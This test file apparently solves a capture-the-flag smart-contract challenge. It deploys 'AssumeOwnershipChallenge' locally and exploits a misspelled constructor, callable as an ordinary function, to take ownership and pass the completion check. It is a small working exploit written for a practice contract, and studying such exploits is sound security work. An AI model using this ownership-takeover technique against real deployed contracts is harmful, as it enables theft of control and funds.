import crypto, {sign} from "crypto";
import {ethers} from "hardhat";
import {BigNumber, Contract, Signer} from "ethers";
import {expect} from "chai";
import {formatEtherscanTx} from "../utils/format";
import {HDNode} from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let challengeDeployer: Signer;
let attacker: Contract;
let contract: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa, challengeDeployer] = accounts;
    const challengeFactory = await ethers.getContractFactory(
        "AssumeOwnershipChallenge"
    );
    contract = await challengeFactory.connect(challengeDeployer).deploy();
    await eoa.provider?.waitForTransaction(contract.deployTransaction.hash);
});

it("solves the challenge", async function () {
    // the supposed-to-be constructor is misspelled (owMer) and can be called

    //player
    contract = contract.connect(eoa);

    tx = await contract.AssumeOwmershipChallenge()
    await tx.wait()
    tx = await contract.authenticate();
    await tx.wait();

    const isComplete = await contract.isComplete();
    expect(isComplete).to.be.true;
});
